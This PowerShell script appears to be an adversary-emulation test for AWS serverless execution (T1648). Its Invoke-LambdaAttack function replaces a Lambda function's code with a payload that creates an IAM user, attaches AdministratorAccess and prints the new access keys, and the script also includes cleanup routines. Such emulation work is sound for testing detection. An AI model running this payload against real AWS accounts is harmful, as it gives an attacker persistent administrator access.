Import-Module AWSPowerShell

function Set-AWSAuthentication {
    param (
        [string]$AccessKey,
        [string]$SecretKey,
        [string]$SessionToken,
        [string]$AWSProfile,
        [string]$AWSRegion
    )
    if ($SessionToken -eq "" -and $AWSProfile -eq "") {
        Set-AWSCredential -AccessKey $AccessKey -SecretKey $SecretKey -StoreAs "T1648-1"
    }
    elseif ($SessionToken -ne "" -and $AWSProfile -ne "") {
        Set-AWSCredential -AccessKey $AccessKey -SecretKey $SecretKey -SessionToken $SessionToken  -StoreAs "T1648-1" 
    }
    elseif ($AWSProfile -ne "") {
        Set-AWSCredential -ProfileName $AWSProfile -StoreAs "T1648-1"
    }

    try {
        Get-STSCallerIdentity -ProfileName "T1648-1" | Out-Null
    }
    catch {
        Write-Host "ERROR: Failed to authenticate to AWS. Please check your credentials and try again."
        exit 1
    }
    Set-DefaultAWSRegion -Region $AWSRegion
}

function Invoke-Terraform {
    param (
        [string]$TerraformCommand,
        [string]$TerraformDirectory,
        [string[]]$TerraformVariables
    )

    $currentPath = Resolve-Path .

    if (-not (Test-Path $TerraformDirectory)) {
        Write-Host "ERROR: Terraform directory not found. Please check the path and try again."
        exit 1
    }

    if (-not (Get-ChildItem $TerraformDirectory -Filter "*.tf")) {
        Write-Host "ERROR: No Terraform files found in the directory. Please check the path and try again."
        exit 1
    }

    foreach($variable in $TerraformVariables) {
        $varName = $variable.Split("=")[0]
        $varValue = $variable.Split("=")[1]
        [Environment]::SetEnvironmentVariable("TF_VAR_$varName", $varValue, "Process")
    }

    Set-Location $TerraformDirectory

    if ($TerraformCommand -eq "init") {
        try {
            terraform init | Out-Null
        }
        catch {
            Write-Host "ERROR: Failed to initialize Terraform. Please check the error message and try again."
            exit 1
        }
    } elseif ($TerraformCommand -eq "apply") {
        try {
            terraform apply -auto-approve | Out-Null
        }
        catch {
            Write-Host "ERROR: Failed to apply Terraform. Please check the error message and try again."
            exit 1
        }
    } elseif ($TerraformCommand -eq "destroy") {
        try {
            terraform destroy -auto-approve | Out-Null
        }
        catch {
            Write-Host "ERROR: Failed to destroy Terraform. Please check the error message and try again."
            exit 1
        }
    } else {
        Write-Host "ERROR: Invalid Terraform command. Please use 'init', 'apply', or 'destroy'."
        exit 1
    }

    Set-Location $currentPath
}

function Invoke-LambdaAttack {
    param (
        [string]$AWSProfile,
        [string]$AWSRegion
    )

    $maliciousContent =  "import json`n"
    $maliciousContent += "import boto3`n`n"  
    $maliciousContent += "def lambda_handler(event, context):`n"
    $maliciousContent += "    client = boto3.client('iam')`n"
    $maliciousContent += "    client.create_user(UserName='T1648-1')`n"
    $maliciousContent += "    response = client.create_access_key(UserName='T1648-1')`n"
    $maliciousContent += "    access_key = response['AccessKey']['AccessKeyId']`n"
    $maliciousContent += "    secret_key = response['AccessKey']['SecretAccessKey']`n"
    $maliciousContent += "    client.attach_user_policy(UserName='T1648-1', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')`n"
    $maliciousContent += "    return {`n"
    $maliciousContent += "        'statusCode': 200,`n"
    $maliciousContent += "        'body': json.dumps({'AccessKeyId': access_key, 'SecretAccessKey': secret_key})`n"
    $maliciousContent += "    }`n"

    $zipPath = [System.IO.Path]::GetTempPath() + "LambdaAttack.zip"
    $zipFile = [System.IO.Compression.ZipFile]::Open($zipPath, [System.IO.Compression.ZipArchiveMode]::Create)
    $zipEntry = $zipFile.CreateEntry("lambda.py")
    $zipStream = $zipEntry.Open()
    $zipWriter = New-Object System.IO.StreamWriter($zipStream)
    $zipWriter.Write($maliciousContent)
    $zipWriter.Close()
    $zipStream.Close()
    $zipFile.Dispose()
    $zipContent = [System.IO.File]::ReadAllBytes($zipPath)

    $null = Update-LMFunctionCode -FunctionName "T1648-1" -ZipFile $zipContent -ProfileName $AWSProfile -Region $AWSRegion
    Sleep 10 # Wait a bit for the Lambda function to update
    $result = Invoke-LMFunction -FunctionName "T1648-1" -ProfileName $AWSProfile -Region $AWSRegion
    $payload = [System.Text.Encoding]::UTF8.GetString($result.Payload.ToArray()) | ConvertFrom-JSON
    $output = $payload | select Body 
    Remove-Item $zipPath
    Write-Host "INFO: Lambda function code updated successfully."
    $accessKeyId = ($output.body | ConvertFrom-JSON).AccessKeyId
    $secretAccessKey = ($output.body | ConvertFrom-JSON).SecretAccessKey
    Write-Host "INFO: New Access Key ID:     $accessKeyId"
    Write-Host "INFO: New Secret Access Key: $secretAccessKey"
}

function Remove-MaliciousUser {
    param (
        [string]$AWSProfile
    )

    try {
        $null = Get-IAMUser -UserName "T1648-1" -ProfileName $AWSProfile
    } catch {
        return
    }

    $accessKeys = Get-IAMAccessKey -UserName "T1648-1" -ProfileName $AWSProfile
    foreach ($accessKey in $accessKeys) {
        $null = Remove-IAMAccessKey -AccessKeyId $accessKey.AccessKeyId -UserName "T1648-1" -ProfileName $AWSProfile -Force
    }
    Sleep 5 # Wait a bit for the access keys to be removed
    $null = Unregister-IAMUserPolicy -UserName "T1648-1" -PolicyArn "arn:aws:iam::aws:policy/AdministratorAccess" -ProfileName $AWSProfile -Force
    $null = Remove-IAMUser -UserName "T1648-1" -ProfileName $AWSProfile -Force
    Write-Host "INFO: Malicious user 'T1648-1' removed successfully."
}

function Remove-TFFiles {
    param (
        [string]$Path
    )

    try {
        Remove-Item "$Path/lambda_code.zip" -ErrorAction SilentlyContinue
        Remove-Item "$Path/terraform.tfstate" -ErrorAction SilentlyContinue
        Remove-Item "$Path/terraform.tfstate.backup" -ErrorAction SilentlyContinue
    } catch {
        return
    }
}
